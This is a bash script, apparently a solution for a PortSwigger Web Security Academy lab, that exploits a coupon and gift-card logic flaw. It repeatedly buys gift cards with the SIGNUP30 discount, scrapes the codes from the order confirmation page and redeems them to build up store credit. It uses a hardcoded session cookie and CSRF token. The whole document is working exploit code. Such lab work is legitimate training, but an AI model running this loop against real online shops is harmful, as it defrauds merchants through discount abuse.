#!/bin/bash

set -x

URL="https://0af1004f0432c33182cc241800bd000c.web-security-academy.net"
KUPON="SIGNUP30"
Q=10
HEADER="Cookie: session=X9U0snN9XO6GtzYBqhIlWBN1zed7w4CC"
CSRF="Lkj4CVI81FFY8wxgkbhZmgOAc1VqfWcR"

laman_myaccount(){

	curl -X GET "${URL}/my-account" -H "${HEADER}"
}


kupon_ke_keranjang() {

	curl -X POST "${URL}/cart" -H "${HEADER}" -H "Content-Type: application/x-www-form-urlencoded" -d "productId=2&redir=PRODUCT&quantity=10"

}

pake_kupon() {

	curl -X POST "${URL}/cart/coupon" -H "${HEADER}" -H "Content-Type: application/x-www-form-urlencoded" -d "csrf=${CSRF}&coupon=SIGNUP30"

}

checkout() {

	curl -X POST "${URL}/cart/checkout" -H "${HEADER}" -H "Content-Type: application/x-www-form-urlencoded" -d "csrf=${CSRF}"

}

list_card() {

	liscard=$(curl -s -X GET "${URL}/cart/order-confirmation?order-confirmed=true" -H "${HEADER}" | grep -Po '(?<=<td>)[A-Za-z0-9]{10}(?=</td>)')
	
}

pake_giftcard() {	

	count=0
	echo "$liscard" | while read -r i; do
    				curl -X POST "${URL}/gift-card" -H "${HEADER}" -d "csrf=${CSRF}&gift-card=${i}"
    
			    	count=$((count + 1))
			    	if [ "$count" -eq 10 ]; then
					break
			    	fi
			done

}

main() {

	for i in {1..30} ; do
	
		echo "looping $i"
		kupon_ke_keranjang
		pake_kupon
		checkout
		list_card
		pake_giftcard
		
	done
}

main
